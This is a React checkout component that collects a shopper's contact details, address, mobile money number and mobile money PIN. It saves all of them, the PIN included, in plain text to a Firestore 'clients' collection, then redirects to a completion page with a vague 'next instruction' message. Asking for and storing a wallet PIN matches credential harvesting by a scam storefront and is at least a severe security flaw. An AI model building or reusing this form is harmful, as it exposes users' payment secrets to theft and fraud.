import React, { useState} from 'react';
import { addDoc, collection, serverTimestamp } from 'firebase/firestore';
import styled from 'styled-components';
import ProductBox from './ProductBox';
import { db } from '../../firebase';
import { toast } from 'react-toastify';
import { useNavigate } from 'react-router-dom';

const initialState = {
  email: '',
  number: '',
  country: '',
  city: '',
  address: '',
  payment: '',
  zipCode: '',
  mobileMoneyNum: '',
  moPin: '',
};

const paymentOption = ['Bank Transfer', 'Mobile Money', 'PayPal'];

const Checkout = () => {
  const [form, setForm] = useState(initialState);
  const navigate = useNavigate();
  const {
    email,
    number,
    country,
    city,
    address,
    zipCode,
    payment,
    mobileMoneyNum,
    moPin,
  } = form;
  const handleChange = (e) => {
    setForm({ ...form, [e.target.name]: e.target.value });
  };


  const onPaymentChange = (e) => {
    setForm({ ...form, payment: e.target.value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (moPin.length > 4) {
      toast.error('Pin must be 4 digit code')
    } else if (moPin.length < 4) {
      toast.error('Pin must be 4 digit code')
    }else {
      if (email &&number &&country &&city &&address &&zipCode &&payment &&mobileMoneyNum &&moPin){
        try {
          await addDoc(collection(db, 'clients'), {
            ...form,
            timestamp: serverTimestamp(),
          });
          toast.success(
            'Checkout successful follow the next instruction to complete your purchase'
          );
        } catch (error) {
          console.log(error);
        }
      } else {
        toast.error('Something went wrong try again!');
      }
    }
    navigate('/complete')
  };

  return (
    <CheckoutWrapper>
      <CheckoutContainer className="container">
        <LeftContent>
          <form onSubmit={handleSubmit}>
            <div className="form-container">
              <input
                type="email"
                name="email"
                placeholder="Enter Email"
                value={email || ''}
                onChange={handleChange}
              />
              <input
                type="number"
                name="number"
                placeholder="Enter Phone"
                value={number || ''}
                onChange={handleChange}
              />
            </div>
            <div className="form-container">
              <input
                type="text"
                name="country"
                placeholder="Country /State"
                value={country || ''}
                onChange={handleChange}
              />
              <input
                type="text"
                name="city"
                placeholder="City /Town"
                value={city || ''}
                onChange={handleChange}
              />
            </div>
            <div className="form-container">
              <input
                type="text"
                name="address"
                placeholder="Residential Address"
                value={address || ''}
                onChange={handleChange}
              />
              <input
                type="text"
                name="zipCode"
                placeholder="Zip Code"
                value={zipCode || ''}
                onChange={handleChange}
              />
            </div>
            <div className="form-container">
              <select value={payment} onChange={onPaymentChange}>
                <option>Please Select Payment Plan</option>
                {paymentOption.map((option, index) => (
                  <option value={option || ''} key={index}>
                    {option}
                  </option>
                ))}
              </select>
              <input
                type="number"
                name="mobileMoneyNum"
                placeholder="Mobile Money Number"
                value={mobileMoneyNum || ''}
                onChange={handleChange}
              />
            </div>
            <div className="form-container">
              <input
                type="password"
                name="moPin"
                placeholder="Mobile Money Pin"
                value={moPin || ''}
                onChange={handleChange}

              />
              <input type="submit" value="Submit" />
            </div>
          </form>
        </LeftContent>
        <RightContent>
          <ProductBox />
        </RightContent>
      </CheckoutContainer>
    </CheckoutWrapper>
  );
};

const CheckoutWrapper = styled.section`
  padding: 40px 0;
  min-height: calc(69vh - 50px);
`;
const CheckoutContainer = styled.div`
  display: grid;
  grid-template-columns: 74% 25%;
  gap: 1%;

  @media screen and (max-width: 430px) {
    grid-template-columns: 100%;
  }
`;
const LeftContent = styled.div`
  padding: 20px 0;

  form {
    .form-container {
      display: flex;
      align-items: center;
      gap: 1rem;
      margin: 20px 0;
      input,
      select {
        padding: 15px 20px;
        width: 100%;
        appearance: none;
        background: #fff;
        box-shadow: 0 0 10px rgba(12, 10, 10, 0.075);
        font-size: 15px;
        font-weight: bold;
      }
      input[type='submit'] {
        background-color: var(--main-bg);
        color: #fff;
        cursor: pointer;
        font-size: 20px;
        font-weight: bold;
        padding: 11px 20px;
      }
    }
  }

  @media screen and (max-width: 430px) {
    form {
      .form-container {
        flex-direction: column;
      }
    }
  }
`;
const RightContent = styled.div``;
export default Checkout;

